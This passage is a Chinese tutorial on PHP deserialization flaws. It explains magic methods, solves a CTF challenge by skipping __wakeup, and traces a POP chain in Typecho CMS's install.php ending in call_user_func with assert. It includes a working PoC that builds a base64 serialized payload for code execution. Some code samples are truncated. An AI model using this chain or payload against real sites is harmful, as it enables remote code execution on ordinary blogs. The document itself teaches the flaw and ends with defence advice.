执行以上代码，当实例化对象被当作字符串使用的时候，`__toString()`函数自动调用。
还有一些不太容易想到的情况也能触发此函数
>   * 反序列化对象与字符串连接时
>   * 反序列化对象参与格式化字符串时
>   * 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）
>   * 反序列化对象参与格式化SQL语句，绑定参数时
>   * 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时
>   * 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有 **toString返回的字符串的时候**
> toString会被调用
>   * 反序列化的对象作为 class_exists() 的参数的时候
>
#### 2.2.5 __get()
在读取不可访问的属性值的时候，此魔法函数会自动调用。
    color;
    ?>
执行以上代码，因为试图访问私有变量`color`导致`__get()`函数自动调用。
#### 2.2.6 __call()
`__call`是调用未定义的方法时调用的。
    notExistFunction("patameters");
    ?>
执行以上代码，`__call()`函数被调用。也就是说，你想要调用方法未定义，那么这个方法名就会作为`__call`的第一个参数传入，而此不存在方法的参数会被装进数组中作为`__call`的第二个参数传入
#### 2.2.7
当然PHP中还有很多[魔术方法](https://www.php.net/manual/zh/language.oop5.magic.php)没有介绍，前面只说了我认为在反序列化漏洞中比较重要的几个，其他的大家有兴趣可以自己去了解。
## CTF中的反序列化
#### 3.1 题目
    file)) {
                if(strchr($this-> file,"\\")===false &&  strchr($this->file, '/')===false)
                show_source(dirname (__FILE__).'/'.$this ->file);
            else{
                die('Wrong filename.');
            }
        }  
        function __wakeup()
        { 
            $this-> file='index.php'; 
        } 
        public function __toString()
        {
            return '' ;
        }
    }     
        if (!isset($_GET['file'])) { 
            show_source('index.php'); 
        } 
        else { 
           $file=base64_decode( $_GET['file']); 
           echo unserialize($file ); 
        } 
    ?>   #
#### 3.2 解答
这道题利用的是PHP反序列化的一个特性，序列化字符串的结构在前面已经说过，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行。此题的解题思路就是如此，通过改写序列化字符串中表示属性个数的数字，使其比真实值大，就可以跳过`__wakeup()`函数。
##### POC
将输出的结果表示属性个数的数字加一
    O:5:"SoFun":2:{s:7:"*file";s:8:"flag.php";}
注意提交的时候需要base64
## CMS实战
选取的是 **typecho CMS** 进行实战演示。
#### 4.1 CMS介绍
Typecho基于PHP5开发，支持多种数据库，是一款内核强健﹑扩展方便﹑体验友好﹑运行流畅的轻量级开源博客程序。
#### 4.2 CMS安装
访问`install.php`按照网站提示安装即可
#### 4.3 漏洞成因
在根目录下的`install.php`文件第232行，调用了 **unserialize**
函数。传入参数是通过类方法获取的，跟进`Typecho_Cookie::get`方法
在文件`Cookie.php`中的第83行定义了类方法，功能为获取指定的Cookie值。第86行看出此值是从Cookie中获取，没有的话就从POST中获取，一步传入了unserialize函数，没有经过过滤，故而反序列化漏洞存在。
到此我们找到了输入点，但是具体能够执行什么类型的攻击以及攻击深度还要取决了类的作用域以及其中的函数。按照思路我们希望构造一个Typecho中已经存在的类，这个类要满足以下条件
  * 有魔法函数，能够在程序正常逻辑中自动执行
  * 魔法函数中存在敏感函数，通过向类属性注入可以代码可以被敏感函数执行，从而达到攻击效果。
那么接下来的任务就是要寻找符合以上要求的类。首先`Typecho_Cookie`这个类是不符合要求的，在`install.php`文件中接着向下看，第234行实例化了`Typecho_Db`，跟进看一看这个类的定义。在文件`Db.php`中发现此类具有`__construct()`魔法函数，在此方法的第120行将传入的参数当作字符串进行拼接。传入的参数`$adapterName`如果是我们可控的参数的话，根据前面所讲，此过程会自动触发`__toString()`魔法函数。
回到上一层，也就是实例化`Typecho_Db`那里，看到`$adapterName`实际上就是`Typecho_Cookie`的一个类属性。而我们已知此类属性是可控的，那么下一步的目标就变成了
  * 找到一个类，其中含有`__toString()`魔法函数，能够在程序正常逻辑中自动执行
  * 此魔法函数中含有敏感函数可以被利用
在`Feed.php`文件中找到了符合上述条件的类`Typecho_Feed`，其中`__toString()`方法中在第290行将`$item['author']->screenName`作为参数传递给了函数
**htmlspecialchars**
，前面讲过，当类试图访问一个不存在或者不可访问的对象是会触发`__get()`魔法函数。换句话说如果`$item['author']`是一个类且其中并不存在类属性`screenName`的话就会触发这个类(`$item['author']`)的`__get()`魔法函数。
现在我们的目标变成了
  * 找到一个类，其中含有`__get()`魔法函数，能够在程序正常逻辑中自动执行
  * 此魔法函数中含有敏感函数可以被利用
在文件`Requests.php`文件中找到了符合要求的类`Typecho_Requests`，在文件第270行找到了`__get()`魔法函数
跟进函数`get`，注意此函数并非魔法函数，而是类方法。在文件的第296行找到了此函数的定义，此函数最后一行调用了`_applyFilter`函数，继续跟进，在文件第159行找到了此函数的定义，其中的第164行调用了`call_user_func`，是一个危险函数可以使用命令执行漏洞来攻击。
到此为止我们从入口一路向下，终于找到了可以利用的敏感函数，总结回顾一下。
  1. 反序列化Typecho_Cookie类方法获得的变量，此处为输入点，可以输入可控的序列化字符串
  2. 实例化Typecho_Db，触发其中的construct魔法函数，其中有一段将类作为字符串拼接
  3. 在Typecho_Feed类中找到toString魔法函数，其中有访问不可访问属性的操作
  4. 在Typech_Requests类中找到get魔法函数，两步调用了call_user_func函数，可以命令执行
根据pop链可以构造POC如下
##### POC
    _items = array(
                '0'=>array(
                    'author'=> new Typecho_Request())
            );
        }
    }
    class Typecho_Request{
        private $_params = array('screenName'=>'phpinfo()');
        private $_filter = array('assert');
    }
    $poc = array(
    'adapter'=>new Typecho_Feed(),
    'prefix'=>'typecho');
    echo base64_encode(serialize($poc));
    ?>
## 防御方法
#### 5.1 过滤用户输入
可以维护一个黑名单或者白名单来限制用户的输入，过滤不合理，不符合程序逻辑的输入。
#### 5.2 Java
参考文章[浅谈Java反序列化漏洞修复方案](https://github.com/Cryin/Paper/blob/master/)